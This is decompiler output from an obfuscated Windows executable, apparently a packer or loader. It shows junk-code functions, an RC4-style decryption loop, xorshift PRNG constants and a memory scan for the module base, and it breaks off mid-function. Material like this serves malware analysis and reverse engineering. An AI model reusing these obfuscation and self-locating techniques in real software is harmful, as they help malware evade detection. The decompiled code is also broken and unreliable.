/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

void sub_405FCA();
void __thiscall sub_4061E7(void *this);
// void __usercall sub_406602(int@<eax>);
// int __userpurge sub_406936@<eax>(int@<eax>, int, int);
void __stdcall sub_406944(int);
// int __userpurge sub_406977@<eax>(int@<eax>, int, int, int);
void __fastcall sub_406E9F(int, unsigned int);
int sub_4073BF();
void __stdcall sub_407424(int);
// int __usercall sub_4075A2@<eax>(int@<edx>, int@<ebp>);
int __stdcall sub_40814C(int);
int __stdcall sub_408787(int, int, int);
int __stdcall sub_4093F7(int);
int __stdcall sub_40967E(int, int);
int __stdcall sub_409714(int, int, int, int);
int __stdcall sub_409BB5(int, int, int, int);
void __stdcall sub_409D0C(int, int, int);
int __fastcall sub_409EC6(int, int, int, int);
int __fastcall sub_409F67(int, int);
void __fastcall sub_40A13F(int, int);
int __stdcall sub_40A701(int);
void __stdcall sub_40AD39(int);
void start();
int sub_40B3EA();
// void __userpurge sub_40B876(int@<eax>, unsigned int@<edx>, unsigned int@<ecx>, int@<ebp>, int);
unsigned __int8 __cdecl sub_40B9DC(_BYTE *, unsigned int, int);
int sub_40C6A5();
// _WORD *__usercall sub_40C725@<eax>(int@<edx>, int@<ebx>, int@<edi>);
// void __usercall sub_40C886(int@<eax>, unsigned int@<edx>, unsigned int@<ecx>, int);
// int __userpurge sub_40CD22@<eax>(int@<eax>, int, int, int);
int sub_40CE87();
// struct _LIST_ENTRY *__usercall sub_40D1AE@<eax>(int@<edi>, int@<esi>);
_BYTE *__cdecl sub_40D1C3(_BYTE *, _BYTE *);
// char *__usercall sub_40D955@<eax>(int@<edi>, int@<esi>, int);
// char *__usercall sub_40D9EE@<eax>(char@<dh>, int@<ebx>);
// void __userpurge sub_40DF44(int@<eax>, int@<ecx>, int, int, int);
// int __userpurge sub_40E04F@<eax>(unsigned int@<eax>, int@<edx>, _DWORD *@<ecx>, _DWORD *@<ebp>, int@<esi>, int, int, int);
// int __userpurge sub_40E257@<eax>(unsigned int@<eax>, int@<edx>, _DWORD *@<ecx>, _DWORD *@<ebp>, int@<esi>, int, int, int);
int __cdecl sub_40E2E1(int, int, unsigned __int8 *);
int sub_40E459();
// void __userpurge sub_40E528(__int16@<ax>, int@<ecx>, int@<ebp>, int);
unsigned int __cdecl sub_40E5D4(_BYTE *);
// char *__usercall sub_40E6DC@<eax>(char@<cf>, int@<edi>, int@<esi>);
// int __userpurge sub_40E9D0@<eax>(int@<eax>, int@<ecx>, int, int);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_426586; // weak
_UNKNOWN unk_426686; // weak
int dword_443004 = 0; // weak
int dword_443008 = 0; // weak
int dword_44300C = 0; // weak
int dword_443010 = 0; // weak
int dword_443014 = 0; // weak
int dword_443018 = 0; // weak
int dword_44301C = 0; // weak
int dword_443020 = 0; // weak
int dword_443024 = 0; // weak
int dword_443028 = 0; // weak
int dword_44302C = 0; // weak
int dword_443030 = 0; // weak
int dword_443034 = 0; // weak
int dword_443038 = 0; // weak
int dword_44303C = 0; // weak
int dword_443040 = 0; // weak
int dword_443044 = 0; // weak
int dword_443048 = 0; // weak
int dword_44304C = 0; // weak
int dword_443054 = 0; // weak
int dword_44321C = 0; // weak
int dword_4432AC = 0; // weak
int dword_443454 = 0; // weak
int dword_443618 = -1392491472; // weak
int dword_443784 = 1145233469; // weak
_UNKNOWN loc_4438D8; // weak
int dword_443960 = -157463; // weak
int dword_4439E0 = -2117533628; // weak
char byte_443CD0 = 'D'; // weak
int dword_443D0C = 1618524867; // weak
char byte_444038 = '\x15'; // weak
char byte_44409C = '\0'; // weak
char byte_4440AC = '\0'; // weak
int dword_444234 = -190743; // weak
int dword_44440C = 899956107; // weak
char byte_4444A8 = '5'; // weak
int dword_4444C4 = 1880984320; // weak
char *off_4445D4 = &byte_4191BB; // weak
int dword_444674 = -679411712; // weak
char byte_4446A8 = 'ë'; // weak
int dword_4446B4 = 1752481656; // weak
int dword_4446DC = -267714560; // weak
int dword_4446FC = -1539495424; // weak
int dword_4449AC = -2082; // weak
int (__thiscall *dword_444A3E)(_DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_444A42)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_444A4A)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_444A4E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_444A52 = -2086657603; // weak
int dword_444A72 = 51090; // weak
_UNKNOWN unk_444A7A; // weak
int dword_444B7D = 88675123; // weak
__int64 (__thiscall *dword_444B8D)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_444B95 = 362436069; // weak
int (__thiscall *dword_444B9D)(_DWORD) = NULL; // weak
int (__stdcall *dword_444BA9)(_DWORD, _DWORD) = NULL; // weak
int dword_444BAD = 0; // weak
int (__fastcall *dword_444BC5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_444BC9; // weak
int dword_444BCF = 0; // weak
int dword_444BD7 = 0; // weak
int dword_444BE3 = 0; // weak
int dword_444BEB = 521288629; // weak
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// extern BOOL (__stdcall *DisableThreadLibraryCalls)(HMODULE hLibModule);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern DWORD (__stdcall *GetLastError)();
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *HeapDestroy)(HANDLE hHeap);
// extern LONG (__stdcall *InterlockedDecrement)(volatile LONG *lpAddend);
// extern LONG (__stdcall *InterlockedIncrement)(volatile LONG *lpAddend);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);


//----- (00405FCA) --------------------------------------------------------
void sub_405FCA()
{
  sub_4093F7(32);
  JUMPOUT(0x406985);
}
// 405FE9: control flows out of bounds to 406985

//----- (004061E7) --------------------------------------------------------
void __thiscall sub_4061E7(void *this)
{
  unsigned int v1; // edx
  unsigned __int16 v2; // [esp+140h] [ebp-7Ch]

  sub_409EC6((int)this, 0, 7, 0);
  if ( v1 >= v2 )
    JUMPOUT(0x406AA4);
  JUMPOUT(0x4090B1);
}
// 4086D4: control flows out of bounds to 406AA4
// 4095A3: control flows out of bounds to 408BE3
// 4086BE: control flows out of bounds to 4090B1
// 409588: control flows out of bounds to 4078D5
// 409597: control flows out of bounds to 406B0E
// 4086BE: variable 'v1' is possibly undefined
// 40AE8A: variable 'v2' is possibly undefined

//----- (00406602) --------------------------------------------------------
void __usercall sub_406602(int a1@<eax>)
{
  int v1; // eax
  int v2; // edx
  int v3; // ecx
  int v4; // edx
  int v5; // ecx
  int v6; // edx
  int v7; // ecx
  int v8; // edx
  int v9; // ecx
  int v10; // ecx
  int v11; // edx
  int v12; // ecx
  int v13; // eax
  int v14; // ecx
  int v15; // edx
  int v16; // ecx
  int v17; // edx
  int v18; // ecx
  int v19; // [esp+8Ch] [ebp-174h]
  __int16 v20; // [esp+C4h] [ebp-13Ch]
  int v21; // [esp+124h] [ebp-DCh]
  int v22; // [esp+168h] [ebp-98h]
  int v23; // [esp+1B4h] [ebp-4Ch]
  unsigned __int8 v24; // [esp+1E0h] [ebp-20h]

  sub_407424(a1);
  sub_409F67(v16, v15);
  sub_409F67(v18, v17);
  GetCurrentProcess();
  GetCommandLineA();
  GetCommandLineA();
  sub_409F67(v3, v2);
  sub_407424(v19);
  sub_409F67(v5, v4);
  sub_409F67(v7, v6);
  sub_409F67(v9, v8);
  sub_407424(v10);
  if ( v12 != v11 )
  {
    v13 = v23 | v24;
    if ( (v11 & 0x24BA) != 0 )
    {
LABEL_8:
      sub_407424(v13);
      sub_407424(v21);
      if ( v14 != v22 )
        JUMPOUT(0x406ABF);
      JUMPOUT(0x40777F);
    }
    v1 = (v20 - 16287) & 0x3073;
  }
  v13 = -((unsigned int)__CFADD__(v1, 1564) + v1 + 1564 + 2013 < (unsigned int)(__CFADD__(
                                                                                  __CFADD__(v1, 1564),
                                                                                  v1 + 1564) | __CFADD__(
                                                                                                 __CFADD__(v1, 1564)
                                                                                               + v1
                                                                                               + 1564,
                                                                                                 2013))
                                                               + 2050);
  goto LABEL_8;
}
// 40664B: control flows out of bounds to 406ABF
// 40962C: control flows out of bounds to 40777F
// 40654F: conditional instruction was optimized away because eax.4>=2B40u
// 40B28E: variable 'v16' is possibly undefined
// 40B28E: variable 'v15' is possibly undefined
// 40B295: variable 'v18' is possibly undefined
// 40B295: variable 'v17' is possibly undefined
// 405F5F: variable 'v14' is possibly undefined
// 405F5F: variable 'v22' is possibly undefined
// 408864: variable 'v11' is possibly undefined
// 406CAC: variable 'v20' is possibly undefined
// 4087E9: variable 'v3' is possibly undefined
// 4087E9: variable 'v2' is possibly undefined
// 408805: variable 'v19' is possibly undefined
// 408815: variable 'v5' is possibly undefined
// 408815: variable 'v4' is possibly undefined
// 408829: variable 'v7' is possibly undefined
// 408829: variable 'v6' is possibly undefined
// 40882E: variable 'v9' is possibly undefined
// 40882E: variable 'v8' is possibly undefined
// 40883E: variable 'v10' is possibly undefined
// 408845: variable 'v12' is possibly undefined
// 40885B: variable 'v23' is possibly undefined
// 408857: variable 'v24' is possibly undefined
// 408904: variable 'v21' is possibly undefined
// 407FA6: variable 'v1' is possibly undefined

//----- (00406936) --------------------------------------------------------
int __userpurge sub_406936@<eax>(int a1@<eax>, int a2, int a3)
{
  int v3; // ecx
  int result; // eax
  unsigned __int8 v5; // [esp+284h] [ebp-120h]

  sub_406602(a1);
  result = v5;
  if ( v3 || v5 )
    return 0;
  return result;
}
// 409C11: variable 'v5' is possibly undefined
// 409CBA: variable 'v3' is possibly undefined

//----- (00406944) --------------------------------------------------------
void __stdcall sub_406944(int a1)
{
  ;
}

//----- (00406977) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __userpurge sub_406977@<eax>(int a1@<eax>, int a2, int a3, int a4)
{
  __int16 v5; // [esp+1ACh] [ebp-190h] BYREF
  int v6; // [esp+1D0h] [ebp-16Ch] BYREF
  int v7; // [esp+274h] [ebp-C8h] BYREF
  __int16 v8; // [esp+2B0h] [ebp-8Ch] BYREF

  sub_408787((int)&v7, a1, (int)&v6);
  return sub_409BB5(8, 0, (int)&v5, (int)&v8) + 4268;
}
// 409C6A: positive sp value 3A4 has been found

//----- (00406E9F) --------------------------------------------------------
void __fastcall sub_406E9F(int a1, unsigned int a2)
{
  int v2; // eax
  int v3; // edx
  int v4; // ecx
  unsigned int v5; // edx
  unsigned int v6; // ecx
  int v7; // eax
  bool v8; // cf
  int v9; // eax
  char v10[36]; // [esp+78h] [ebp-18Ch] BYREF
  int v11; // [esp+B0h] [ebp-154h]
  char v12[12]; // [esp+C4h] [ebp-140h] BYREF
  int v13; // [esp+D0h] [ebp-134h]
  __int16 v14; // [esp+128h] [ebp-DCh]
  int v15; // [esp+140h] [ebp-C4h] BYREF
  int v16; // [esp+170h] [ebp-94h]
  char v17[12]; // [esp+190h] [ebp-74h] BYREF
  int v18; // [esp+1D8h] [ebp-2Ch]
  int v19; // [esp+1E8h] [ebp-1Ch]
  unsigned __int16 v20; // [esp+1FCh] [ebp-8h]
  int v21; // [esp+200h] [ebp-4h]

  v7 = (unsigned __int8)v13;
  v8 = (unsigned __int8)v13 < a2;
  if ( (unsigned __int8)v13 >= a2 )
  {
    v21 ^= 0x8B7u;
    if ( a1 || (v8 = v20 < a2, v20 != a2) )
    {
LABEL_11:
      --v13;
      v16 |= 0xFFFFDA5F;
      v18 = (unsigned __int8)(v12[4] & v18);
      sub_40A13F(0, a2);
      sub_406602((v2 | 0x245) ^ 0x89D);
      sub_40AD39((int)&v15);
      sub_40B3EA();
      sub_40B3EA();
      sub_40AD39((int)v17);
      sub_409714(0, v3, v4, v19);
      if ( v6 )
      {
        v9 = 15045;
        if ( v5 >= v6 )
          v9 = (v5 < v6) + 30090;
        v15 ^= v9;
      }
      sub_409BB5(41, 0, (int)v10, (int)v12);
      JUMPOUT(0x4082E8);
    }
    v7 = (unsigned __int8)v14;
  }
  v11 |= v7 - (v8 + 12512);
  goto LABEL_11;
}
// 40B145: control flows out of bounds to 4082E8
// 407C88: variable 'v6' is possibly undefined
// 406BC3: variable 'v2' is possibly undefined
// 408613: variable 'v3' is possibly undefined
// 408613: variable 'v4' is possibly undefined
// 40ADF8: variable 'v5' is possibly undefined
// 406E9F: using guessed type char var_74[12];
// 406E9F: using guessed type char var_18C[36];

//----- (004073BF) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int sub_4073BF()
{
  int result; // eax
  int v1; // edx
  int v2; // ecx
  int v3; // edx
  int v4; // ecx
  unsigned __int16 v5; // [esp+E8h] [ebp-2B8h]
  char v6[64]; // [esp+128h] [ebp-278h] BYREF
  int v7; // [esp+18Ch] [ebp-214h]
  int v8; // [esp+1D0h] [ebp-1D0h]

  sub_406944((int)v6);
  v7 += 144;
  sub_409EC6(v2, v1, 34, 0);
  if ( v5 == v3 || v3 || (result = 2 * (((_WORD)v8 + v5) & 0x3A97), !v4) )
    JUMPOUT(0x406AB3);
  return result;
}
// 409C6A: positive sp value 3A4 has been found
// 4065B5: control flows out of bounds to 406AB3
// 409AF6: variable 'v2' is possibly undefined
// 409AF6: variable 'v1' is possibly undefined
// 4094C4: variable 'v3' is possibly undefined
// 409C85: variable 'v5' is possibly undefined
// 4094E3: variable 'v4' is possibly undefined
// 4073BF: using guessed type char var_278[64];

//----- (00407424) --------------------------------------------------------
void __stdcall sub_407424(int a1)
{
  ;
}

//----- (004075A2) --------------------------------------------------------
int __usercall sub_4075A2@<eax>(int a1@<edx>, int a2@<ebp>)
{
  int v2; // eax

  if ( (a1 & 0x2E81) != 0 || (v2 = *(unsigned __int8 *)(a2 - 804) ^ 0x13BD, v2 != a1) )
    v2 = *(unsigned __int8 *)(a2 - 584) ^ 0x58B;
  return v2 ^ 0x1D6B;
}

//----- (0040814C) --------------------------------------------------------
int __stdcall sub_40814C(int a1)
{
  unsigned __int16 v2; // [esp+144h] [ebp-20h]

  return v2;
}
// 40A2A3: variable 'v2' is possibly undefined

//----- (00408787) --------------------------------------------------------
int __stdcall sub_408787(int a1, int a2, int a3)
{
  unsigned int v3; // eax
  int v4; // edx
  int v5; // ecx
  unsigned int v6; // edx
  int v7; // ecx
  int v8; // edx
  int v9; // ecx
  unsigned __int16 v11; // [esp+24h] [ebp-308h]
  unsigned __int8 v12; // [esp+44h] [ebp-2E8h]
  unsigned __int16 v13; // [esp+180h] [ebp-1ACh]
  unsigned __int8 v14; // [esp+1E4h] [ebp-148h]
  char v15[8]; // [esp+1ECh] [ebp-140h] BYREF
  unsigned __int16 v16; // [esp+1F4h] [ebp-138h]
  int v17; // [esp+21Ch] [ebp-110h]
  int v18; // [esp+294h] [ebp-98h]
  char v19[68]; // [esp+2CCh] [ebp-60h] BYREF
  unsigned __int16 v20; // [esp+310h] [ebp-1Ch]

  sub_4073BF();
  sub_409F67(v5, v4);
  sub_409BB5(60, 0, (int)v19, (int)v15);
  sub_409EC6(v9, v8, 29, 0);
  v17 &= ((v18 | v14 ^ 0xF18 | 0x1A58u) < 0xF35) + v20 + 11721;
  sub_4073BF();
  if ( !v7
    || (v16 & (unsigned __int16)v7) != 0
    || (v3 = (unsigned __int8)v19[52] + 4285, (v6 & v3) != 0) && (v3 = v11 - 1533, v6 >= v3) )
  {
    v3 = v12;
  }
  sub_406936(v3, v7, v6);
  return v13;
}
// 4087A8: variable 'v5' is possibly undefined
// 4087A8: variable 'v4' is possibly undefined
// 408D01: variable 'v9' is possibly undefined
// 408D01: variable 'v8' is possibly undefined
// 408D12: variable 'v14' is possibly undefined
// 406D6E: variable 'v12' is possibly undefined
// 408ABA: variable 'v7' is possibly undefined
// 409379: variable 'v6' is possibly undefined
// 409381: variable 'v11' is possibly undefined
// 40AEF5: variable 'v13' is possibly undefined
// 408787: using guessed type char var_140[8];

//----- (004093F7) --------------------------------------------------------
int __stdcall sub_4093F7(int a1)
{
  int v2; // edx
  int v3; // ecx
  unsigned __int8 v4; // [esp+28h] [ebp-2C0h]
  char v5[24]; // [esp+13Ch] [ebp-1ACh] BYREF
  int v6; // [esp+154h] [ebp-194h]
  int v7; // [esp+1DCh] [ebp-10Ch]
  __int16 v8; // [esp+2B4h] [ebp-34h]

  sub_407424(-2124578115);
  sub_406944((int)v5);
  if ( (((_WORD)v7 + v8) & 0x3710) != -1807 )
    return 2 * (v4 - 5691) - 8485;
  if ( (v3 & v2) != 0 )
    return 2 * (v4 - 5691) - 8485;
  v6 = 0;
  if ( v3 )
    return 2 * (v4 - 5691) - 8485;
  else
    return 0;
}
// 4063C9: variable 'v3' is possibly undefined
// 4098F8: variable 'v4' is possibly undefined
// 40ABEB: variable 'v2' is possibly undefined
// 4093F7: using guessed type char var_1AC[24];

//----- (0040967E) --------------------------------------------------------
int __stdcall sub_40967E(int a1, int a2)
{
  return 17664;
}

//----- (00409714) --------------------------------------------------------
int __stdcall sub_409714(int a1, int a2, int a3, int a4)
{
  int result; // eax
  unsigned __int16 v5; // dx
  int v6; // eax
  unsigned int v7; // kr00_4
  int v8; // edx
  int v9; // ecx
  int v10; // eax
  __int16 v11; // ax
  char v12; // cf
  char v13[44]; // [esp+9Ch] [ebp-320h] BYREF
  unsigned __int16 v14; // [esp+158h] [ebp-264h]
  char v15[144]; // [esp+164h] [ebp-258h] BYREF
  char v16[36]; // [esp+1F4h] [ebp-1C8h] BYREF
  unsigned __int16 v17; // [esp+244h] [ebp-178h]
  char v18[92]; // [esp+25Ch] [ebp-160h] BYREF
  unsigned int v19; // [esp+2B8h] [ebp-104h]
  unsigned __int16 v20; // [esp+33Ch] [ebp-80h]

  sub_40967E((int)v15, (int)v16);
  sub_409BB5(3, 0, (int)v18, (int)v13);
  v11 = sub_4093F7(13);
  v10 = (v12 + v11 + 13576) & 0x854;
  v7 = v10 + v19;
  v6 = (((unsigned int)v10 | 0x68F00000000i64) + __PAIR64__(v10, v19)) >> 32;
  v19 = v7;
  if ( v8 >= 0 )
    v6 = v20;
  sub_406602(v6);
  sub_40A13F(v9, 0);
  result = v17;
  if ( (v5 & v17) == 0 )
    return v14;
  return result;
}
// 4077AE: variable 'v9' is possibly undefined
// 4077E4: variable 'v5' is possibly undefined
// 40B1FA: variable 'v12' is possibly undefined
// 409DC7: variable 'v8' is possibly undefined
// 409714: using guessed type char var_160[92];
// 409714: using guessed type char var_1C8[36];
// 409714: using guessed type char var_258[144];
// 409714: using guessed type char var_320[44];

//----- (00409BB5) --------------------------------------------------------
int __stdcall sub_409BB5(int a1, int a2, int a3, int a4)
{
  int result; // eax
  unsigned __int16 v5; // [esp+2B8h] [ebp-110h]
  unsigned __int16 v6; // [esp+344h] [ebp-84h]

  result = v6;
  if ( !v6 )
    return v5;
  return result;
}
// 4079C2: variable 'v6' is possibly undefined
// 407797: variable 'v5' is possibly undefined

//----- (00409D0C) --------------------------------------------------------
void __stdcall sub_409D0C(int a1, int a2, int a3)
{
  ;
}

//----- (00409EC6) --------------------------------------------------------
int __fastcall sub_409EC6(int a1, int a2, int a3, int a4)
{
  int v4; // edx
  int v5; // edx
  int v6; // ecx
  int v7; // edx
  int v8; // ecx
  unsigned int v9; // ecx
  int v10; // edx
  int v11; // ecx
  unsigned __int8 v13; // [esp+FCh] [ebp-20h]
  unsigned __int16 v14; // [esp+100h] [ebp-1Ch]

  sub_409F67(a1, a2);
  sub_409F67(v11, v10);
  sub_409F67(v8, v7);
  sub_407424(1611549350);
  if ( v13 == v4 || v9 >= v13 )
    JUMPOUT(0x406A9C);
  sub_407424(-70281447);
  sub_409F67(v6, v5);
  return v14;
}
// 407F52: control flows out of bounds to 406A9C
// 40B610: conditional instruction was optimized away because ecx.4==0
// 409ED8: variable 'v11' is possibly undefined
// 409ED8: variable 'v10' is possibly undefined
// 409A78: variable 'v8' is possibly undefined
// 409A78: variable 'v7' is possibly undefined
// 407F34: variable 'v13' is possibly undefined
// 407F3A: variable 'v4' is possibly undefined
// 407F4A: variable 'v9' is possibly undefined
// 408587: variable 'v6' is possibly undefined
// 408587: variable 'v5' is possibly undefined
// 40A588: variable 'v14' is possibly undefined

//----- (00409F67) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __fastcall sub_409F67(int a1, int a2)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_4075A2(a2, (int)&savedregs);
}
// 409F6A: bad sp value at call

//----- (0040A13F) --------------------------------------------------------
void __fastcall sub_40A13F(int a1, int a2)
{
  sub_409F67(a1, a2);
  JUMPOUT(0x406AEB);
}
// 40A108: control flows out of bounds to 406AEB

//----- (0040A701) --------------------------------------------------------
int __stdcall sub_40A701(int a1)
{
  int v2; // [esp+38h] [ebp-284h]
  unsigned __int8 v3; // [esp+1D0h] [ebp-ECh]

  return v2 ^ v3;
}
// 4067E2: variable 'v2' is possibly undefined
// 4067DB: variable 'v3' is possibly undefined

//----- (0040AD39) --------------------------------------------------------
void __stdcall sub_40AD39(int a1)
{
  ;
}

//----- (0040B0ED) --------------------------------------------------------
void start()
{
  int v0; // edx
  int v1; // ecx
  char v2[12]; // [esp+11Ch] [ebp-1D8h] BYREF
  char v3[56]; // [esp+1B4h] [ebp-140h] BYREF

  sub_40A701(-218960574);
  sub_40814C(0);
  sub_40AD39((int)v3);
  sub_40AD39((int)v2);
  if ( (v1 & v0) != 0 )
    JUMPOUT(0x4069FF);
  JUMPOUT(0x408229);
}
// 406E0C: control flows out of bounds to 4069FF
// 407D39: control flows out of bounds to 408229
// 406DF4: variable 'v1' is possibly undefined
// 406DF4: variable 'v0' is possibly undefined
// 40B0ED: using guessed type char var_1D8[12];
// 40B0ED: using guessed type char var_140[56];

//----- (0040B3EA) --------------------------------------------------------
int sub_40B3EA()
{
  int v1; // eax
  char v2[12]; // [esp+304h] [ebp-F8h] BYREF
  int v3; // [esp+310h] [ebp-ECh]

  sub_4093F7(51);
  v1 = sub_4073BF() + 15375;
  sub_406936(v1, v1, v3);
  sub_4093F7(57);
  sub_406944((int)v2);
  return 17740;
}
// 40B3EA: using guessed type char var_F8[12];

//----- (0040B876) --------------------------------------------------------
void __userpurge sub_40B876(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4@<ebp>, int a5)
{
  int v5; // eax
  bool v6; // cf
  int v7; // edx
  int v8; // eax
  unsigned int v9; // edx
  unsigned int v10; // ecx
  int v11; // ecx

  v5 = a1 + 8782;
  if ( (a3 & v5) != 0 )
    goto LABEL_10;
  v6 = a2 < a3;
  if ( a2 != a3 )
  {
LABEL_4:
    *(_DWORD *)(a4 - 364) |= -2 * v6;
    goto LABEL_6;
  }
  *(_DWORD *)(a4 - 376) &= *(unsigned __int16 *)(a4 - 268);
  if ( !a3 )
  {
    v5 = 2 * *(unsigned __int16 *)(a4 - 104);
LABEL_10:
    v6 = __CFADD__(v5, 4639);
    goto LABEL_4;
  }
LABEL_6:
  sub_406944(a4 - 276);
  if ( (v11 & 0x2AE9) != 0 )
  {
    sub_40E528(*(_WORD *)(a4 - 312) & (*(_WORD *)(a4 - 308) - 8519), v11, a4, a5);
  }
  else
  {
    sub_405FCA();
    v8 = *(unsigned __int16 *)(a4 - 100);
    if ( v9 >= v10 )
      v8 = 0;
    sub_407424(v8);
    *(_DWORD *)(a4 - 324) += *(unsigned __int8 *)(a4 - 344)
                           + 18260
                           + __CFADD__(*(unsigned __int8 *)(a4 - 344) + 7835, 10425);
    sub_40A701(v7);
    sub_409BB5(16, 0, a4 - 148, a4 - 232);
  }
}
// 40BB65: variable 'v7' is possibly undefined
// 40D6F1: variable 'v9' is possibly undefined
// 40D6F1: variable 'v10' is possibly undefined
// 40E50A: variable 'v11' is possibly undefined

//----- (0040B9DC) --------------------------------------------------------
unsigned __int8 __cdecl sub_40B9DC(_BYTE *a1, unsigned int a2, int a3)
{
  int v3; // edx
  unsigned __int8 result; // al
  unsigned __int8 v5; // bl
  int v6; // edi
  unsigned int i; // [esp+10h] [ebp-8h]
  unsigned __int8 v9; // [esp+17h] [ebp-1h]

  v5 = *(_BYTE *)(a3 + 256);
  v9 = *(_BYTE *)(a3 + 257);
  for ( i = 0; i < a2; ++a1 )
  {
    v3 = (v5 + 1) % 256;
    v5 = (v5 + 1) % 256;
    v6 = (unsigned __int8)v3;
    v9 += *(_BYTE *)(a3 + (unsigned __int8)v3);
    sub_40D1C3((_BYTE *)(a3 + (unsigned __int8)v3), (_BYTE *)(a3 + v9));
    *a1 ^= *(_BYTE *)(a3 + (unsigned __int8)(*(_BYTE *)(a3 + v9) + *(_BYTE *)(a3 + v6)));
    ++i;
  }
  *(_BYTE *)(a3 + 256) = v5;
  result = v9;
  *(_BYTE *)(a3 + 257) = v9;
  return result;
}

//----- (0040C6A5) --------------------------------------------------------
int sub_40C6A5()
{
  return sub_40CE87();
}

//----- (0040C725) --------------------------------------------------------
_WORD *__usercall sub_40C725@<eax>(int a1@<edx>, int a2@<ebx>, int a3@<edi>)
{
  int v3; // edx
  bool v4; // cf
  int v5; // edi
  unsigned int v6; // eax
  int v7; // ebx
  char v8; // tt
  int i; // ecx
  _WORD *result; // eax
  int v11; // edx
  char *retaddr; // [esp+0h] [ebp+0h]

  dword_443008 += a2;
  dword_443024 += 26396;
  v3 = dword_444A52 ^ (a1 + 1392);
  v4 = __CFADD__(dword_443784, a2);
  v7 = dword_443784 + a2;
  dword_444A52 = v3;
  v4 = __CFADD__(v4, a3) | __CFADD__(v4 + a3, 27583);
  dword_44303C = dword_4446DC;
  v5 = 16094;
  v6 = (unsigned int)retaddr;
  v8 = v4 + 97;
  v4 = (unsigned __int8)v7 < (unsigned __int8)(v4 + 97);
  LOBYTE(v7) = v7 - v8;
  for ( i = dword_4446DC - (v4 + 923); ; dword_443038 += i )
  {
    v7 += (int)&InterlockedIncrement;
    result = (_WORD *)(v6 & 0xFFFFF000);
    LOWORD(v3) = *result;
    dword_443038 = v5;
    dword_443004 = i;
    v11 = v3 + 25971;
    v3 = v11 - 49088;
    dword_443034 = 11479;
    v5 = dword_443618;
    if ( !(_WORD)v3 )
      break;
    i += 18536;
    v6 = (unsigned int)result - 1;
    dword_443010 -= v7;
  }
  dword_444BAD = (int)result;
  dword_443004 = i;
  return result;
}
// 443004: using guessed type int dword_443004;
// 443008: using guessed type int dword_443008;
// 443010: using guessed type int dword_443010;
// 443024: using guessed type int dword_443024;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 44303C: using guessed type int dword_44303C;
// 443618: using guessed type int dword_443618;
// 443784: using guessed type int dword_443784;
// 4446DC: using guessed type int dword_4446DC;
// 444A52: using guessed type int dword_444A52;
// 444BAD: using guessed type int dword_444BAD;

//----- (0040C886) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_40C886(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_40B876(a1, a2, a3, (int)&savedregs, a4);
}
// 40C889: bad sp value at call

//----- (0040CD22) --------------------------------------------------------
int __userpurge sub_40CD22@<eax>(int a1@<eax>, int a2, int a3, int a4)
{
  int v4; // edx
  int v5; // edx
  int v6; // eax
  char v7; // cf
  char v9[48]; // [esp+B8h] [ebp-260h] BYREF
  char v10[4]; // [esp+E8h] [ebp-230h] BYREF
  char v11[48]; // [esp+20Ch] [ebp-10Ch] BYREF
  char v12[16]; // [esp+23Ch] [ebp-DCh] BYREF
  int v13; // [esp+24Ch] [ebp-CCh]
  char v14[28]; // [esp+25Ch] [ebp-BCh] BYREF
  char v15[48]; // [esp+278h] [ebp-A0h] BYREF
  char v16[28]; // [esp+2A8h] [ebp-70h] BYREF
  int v17; // [esp+2C4h] [ebp-54h]

  sub_40DF44(a1, (int)v16, v13, (int)v16, (int)v14);
  sub_40B3EA();
  sub_408787((int)v10, v4, (int)v15);
  sub_406944((int)v11);
  sub_409714(0, v17, v5, v5);
  v6 = sub_409BB5(49, 0, (int)v9, (int)v12);
  return (__PAIR64__(v6 - ((unsigned int)v7 + 6393), v6) - (((unsigned int)v7 + 6393) | 0x148E00000000i64)) >> 32;
}
// 40CD5C: variable 'v4' is possibly undefined
// 40CDC5: variable 'v5' is possibly undefined
// 40CDEC: variable 'v7' is possibly undefined
// 40CD22: using guessed type char var_BC[28];
// 40CD22: using guessed type char var_A0[48];
// 40CD22: using guessed type char var_230[4];
// 40CD22: using guessed type char var_DC[16];
// 40CD22: using guessed type char var_260[48];
// 40CD22: using guessed type char var_10C[48];

//----- (0040CE87) --------------------------------------------------------
int sub_40CE87()
{
  unsigned int v0; // eax
  int result; // eax

  LOBYTE(dword_443014) = 1;
  v0 = dword_444A72 ^ (dword_444A72 << 11);
  dword_444A72 = dword_444B95;
  dword_444B95 = dword_444BEB;
